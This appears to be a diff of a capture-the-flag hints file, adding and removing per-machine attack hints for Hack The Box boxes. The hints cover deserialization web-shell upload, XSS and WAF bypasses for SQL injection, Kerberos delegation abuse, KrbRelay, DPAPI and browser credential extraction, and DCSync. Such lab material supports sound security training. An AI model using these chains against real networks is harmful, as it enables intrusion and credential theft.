+- The deserialization filter blocks ObjectDataProvider, WindowsIdentity, and System gadget strings; use the in-application Cereal.DownloadHelper type with URL and FilePath set to C:\inetpub\source\uploads\cmd.aspx. The server prefixes the downloaded name with 21098374243-, so trigger /uploads/21098374243-cmd.aspx.
+- The react-marked-markdown XSS requires javascript-link/backtick syntax, and literal parentheses are unusable in this Markdown path; encode the XHR parentheses as \x28 and \x29 so the admin browser can make the localhost-only request that triggers deserialization.
+- Cereal is a Windows IIS/.NET target; the CSV's Linux environment label is incorrect.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Identify the exact serialization format, signing/encryption boundary, and gadget environment before generating a payload; source review often reveals the required class/library.
 - Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
@@ -5295,8 +5304,8 @@ Quick is a hard difficulty Linux machine that features a website running on the 
 - Port 9001 is the visible Apache site, but also enumerate HTTP/3/QUIC with an appropriate client; the connectivity PDF contains the portal default password and client identity clues.
 - Build likely client email addresses from testimonials/company names and test the disclosed shared password.
 - The ticket portal interprets Edge Side Includes; use ESI/XSLT Java Runtime execution to stage and run a shell.
+- The portal is HTTP/3 over UDP 443 and ordinary browser enumeration does not expose it in the writeup's setup. Build Cloudflare quiche's examples and use target/debug/examples/http3-client to request https://portal.quick.htb?view=docs and download docs/Connectivity.pdf, which holds the shared portal password.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - After landing on Linux, inspect Apache configuration (`apachectl -S`, `/etc/apache2/sites-enabled/*`, `sites-available/*`, included configs, and `.htaccess`). Record hidden `ServerName`/aliases, document roots, proxy targets, access-control headers, credentials, and localhost-only vhosts, then tunnel/enumerate them.
@@ -5389,6 +5398,7 @@ Vintage is a hard difficulty Windows machine designed around an assumed breach s
 
 - Follow password reuse from svc_sql to an interactive user, then inspect Windows Credential Manager/DPAPI secrets after landing.
 - Re-collect/inspect BloodHound after each group change because the later RBCD edge depends on the newly compromised user's group membership.
+- Evil-WinRM is a network logon and cannot expose C.Neri's saved Credential Manager secret. Use Invoke-RunasCs as C.Neri with logon type 2/default interactive logon and -ForceProfile, then run cmdkey /list plus Invoke-WCMDump or SharpDPAPI to recover C.Neri_adm.
 
 ### User path
 
@@ -5423,6 +5433,8 @@ Open the PDF around page **5** and search for the technologies, functions, filen
 - Add the controlled user to the group that has write access to the DC's RBCD attribute.
 - Set msDS-AllowedToActOnBehalfOfOtherIdentity/PrincipalsAllowedToDelegateToAccount for the controlled principal, request the appropriate impersonation service ticket, and target a DC service SPN.
 - Use the delegated ticket for administrative access/DCSync while keeping Kerberos cache and SPN names exact.
+- After adding FS01$ to DelegatedAdmins, obtain its TGT with kinit -f; a normal kinit ticket is not forwardable and getST fails with 'Initial TGT not forwardable.'
+- Administrator is restricted from network/delegation logons on this target. Impersonate Domain Admin L.BIANCHI_ADM instead and request cifs/dc01.vintage.htb with -altservice HTTP/dc01.vintage.htb so the resulting ticket can be used for WinRM.
 - For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.
 - Enumerate MSSQL `IMPERSONATE` permissions and test `EXECUTE AS LOGIN/USER`; re-check effective server roles after impersonation.
 
@@ -5463,6 +5475,7 @@ RustyKey is a hard difficulty Windows Machine which showcases a Timeroasting Att
 - Scan UDP as well as TCP: NTP/123 enables NetExec timeroast, which returns machine/trust-account hashes.
 - Patch timecrack's wordlist reader to latin-1 if rockyou triggers UnicodeDecodeError; crack RID 1125 and map that RID with lookupsid to IT-Computer3$.
 - BloodHound shows IT-Computer3$ can add itself to HelpDesk, and HelpDesk can ForceChangePassword on bb.morgan; perform both and obtain a fresh TGT before WinRM.
+- If bb.morgan TGT acquisition returns KDC_ERR_PREAUTH_FAILED after the HelpDesk password reset, the cleanup task has reverted the changed password; force-change bb.morgan again and immediately request a fresh TGT.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
 - Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.
@@ -5558,7 +5571,6 @@ DarkZero is a hard-difficulty Windows machine designed around an assumed breach 
 - Enumerate MSSQL linked servers, login mappings, impersonation paths, and whether commands can be executed through a trusted link under a stronger context.
 - Check whether MSSQL `xp_cmdshell` is enabled or can be enabled by the current role; distinguish database-level access from OS command execution.
 - Confirm `SeImpersonatePrivilege`, OS build, and available coercion path before selecting a Potato/PrintSpoofer-style token impersonation technique.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Use SSH/local/dynamic port forwarding for internal-only services and hidden vhosts. Preserve the required Host header/DNS name through the tunnel rather than browsing only `localhost`.
 - Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
 
@@ -5567,6 +5579,7 @@ DarkZero is a hard-difficulty Windows machine designed around an assumed breach 
 - The xp_cmdshell token lacks the SeImpersonate privileges expected for the service account; inspect C:\Policy_Backup.inf and its Privilege Rights section.
 - Policy_Backup.inf shows svc_sql has SeServiceLogonRight. Recover the account hash/ticket, change to a known password, then use RunasCs with LogonType 5 and BypassUAC to create a true service-logon token.
 - Confirm SeImpersonatePrivilege is restored in the new token, then use SharpEfsPotato for SYSTEM on DC02.
+- Recovering a cleartext-equivalent password for the required LogonType 5 token is a specific chain: run Rubeus tgtdeleg as svc_sql, convert the kirbi to ccache, tunnel to DC02, request a User-template certificate with certipy using that ticket, authenticate the PFX to recover svc_sql's NT hash, change it to a known password with impacket-changepasswd, then invoke RunasCs with -LogonType 5 -BypassUAC.
 
 ### User path
 
@@ -5700,6 +5713,8 @@ Open the PDF around page **5** and search for the technologies, functions, filen
 
 - Use KrbRelay from the landed session, selecting a suitable CLSID/coercion path, to relay the current Kerberos context to LDAP.
 - Use the relayed LDAP privilege to add winrm_user to the local Administrators group, then start a fresh elevated session/token.
+- Direct KrbRelay execution from Evil-WinRM returns Access Denied because PowerShell remoting is a noninteractive network-logon session. Launch KrbRelay through RunasCs logon type 9/runas-netonly; the supplied password can be arbitrary because this mode does not validate it locally.
+- Run CheckPort.exe first to select a free OXID resolver port and choose a CLSID valid for the target Windows build before relaying to ldap/dc.absolute.htb. After -add-groupmember Administrators succeeds, log out and reconnect so the new group SID is present in the token.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 
 ### Root / Administrator path
@@ -5826,6 +5841,7 @@ Multimaster is an insane diﬃculty Windows machine featuring a web application 
 - Use MSSQL SUSER_SID('MEGACORP\Administrator'), DATALENGTH, and SUBSTRING to exfiltrate the binary SID one byte at a time.
 - Remove the final RID to obtain the domain SID, then automate candidate RIDs with SUSER_SNAME(domain-SID + RID); throttle requests (the writeup uses a two-second delay) to avoid the WAF block.
 - Spray the enumerated users and cracked passwords over SMB/WinRM; tushikikatomo/finance1 provides the first WinRM shell.
+- A quote in the /api/getColleagues JSON body receives 403 from the WAF. Encode the entire JSON request body as UTF-16 (UTF-32 is also accepted by the JSON parser) to pass the filter, then perform the five-column UNION SQL injection and SID/RID exfiltration.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
 - Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
 - From MSSQL, query `SUSER_SID('DOMAIN\KnownUser')` to recover a binary SID when LDAP/RPC is blocked. Strip the final RID to obtain the domain SID.
@@ -5878,7 +5894,6 @@ Open the PDF around page **18** and search for the technologies, functions, file
 - Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - After finding valid users, test every account for Kerberos pre-authentication disabled (`GetNPUsers`), then crack the returned AS-REP hash offline.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - With SeBackup, use backup semantics (for example DiskShadow/robocopy or BackupOperator tooling) to copy SAM/SYSTEM or NTDS/SYSTEM, then extract hashes offline.
 - Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
 - Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
@@ -5995,10 +6010,11 @@ Open the PDF around page **5** and search for the technologies, functions, filen
 - Combine the controlled gMSA with RBCD/U2U so the S4U2Self ticket becomes usable for S4U2Proxy.
 - Request a ticket impersonating the DC/computer account or another replication-capable principal for an appropriate service SPN, then use it for DCSync.
 - Keep the ThePorgs Impacket fork and ccache/SPN names consistent because stock tooling lacks parts of the no-preauth/delegation flow used here.
+- Before rbcd.py, put the short hostname first in /etc/hosts as '10.10.11.231 dc01 dc01.rebound.htb rebound.htb'; omitting this ordering makes rbcd.py fail with 'invalid server address.' Use ldap_monitor (which has an SPN) as delegate-from, delegator$ as delegate-to, and LDAPS.
+- Administrator is NOT_DELEGATED, so the working RBCD/KCD bridge impersonates DC01$: first use ldap_monitor to obtain a forwardable browser/dc01.rebound.htb ticket for DC01$, then give that ccache to delegator$ via -additional-ticket to request http/dc01.rebound.htb before DCSync. A classic single getST call fails KDC_ERR_BADOPTION because constrained delegation lacks protocol transition.
 - For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
 
 ### Root / Administrator path
